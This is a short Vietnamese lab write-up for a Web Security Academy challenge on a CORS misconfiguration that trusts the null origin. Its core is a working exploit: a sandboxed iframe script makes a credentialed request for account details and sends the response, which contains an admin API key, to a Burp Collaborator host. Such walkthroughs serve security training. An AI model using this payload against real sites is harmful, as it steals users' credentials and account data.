# CORS vulnerability with trusted null origin



Header Origin của challenge này: 

+ Không cho phép các domain nào ngoài domain của trang web challenge
+ cho phép dùng `null`

>  `Origin:null` thường được sử dụng trong môi trường phát triển, để trang web có thể truy cập cấu  trúc thư mục nội bộ 

Chúng ta sẽ lạm dụng null origin sử dụng thẻ iframe và gửi yêu cầu bên trong thẻ iframe và gửi sandbox iframe đến trang web đích ở định dạng sau

*Null origin exploit* 

```apl
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://0a2900690498e416c0521e62003e00fe.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='https://bp4ha2l9z0687iwi89m9o6ci99fz3o.burpcollaborator.net/?key='+this.responseText;
};
</script>"></iframe>
```

Sau khi store script bên máy chủ exploit chúng ta nhận được requests đến burp collab

![image](https://user-images.githubusercontent.com/68894302/174557416-9d1c0a66-8019-4f1c-9890-6587f4fd95e6.png)

API key của admin chính là khóa để giải quyết challenge

![image](https://user-images.githubusercontent.com/68894302/174557758-f56f8c31-9959-4b5a-8e46-927d2fd7cd2a.png)